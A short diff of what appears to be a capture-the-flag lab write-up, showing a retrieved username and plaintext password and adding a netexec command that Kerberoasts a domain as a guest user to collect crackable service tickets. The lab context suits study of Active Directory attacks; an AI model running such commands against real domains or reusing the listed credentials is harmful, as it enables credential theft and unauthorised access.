@@ -70,3 +70,10 @@ Retrieved Credentials
 ```
 Freddy McSorley:CrabSharkJellyfish192
 ```
+
+## Kerberoasting using nxc
+
+```
+nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
+```
+
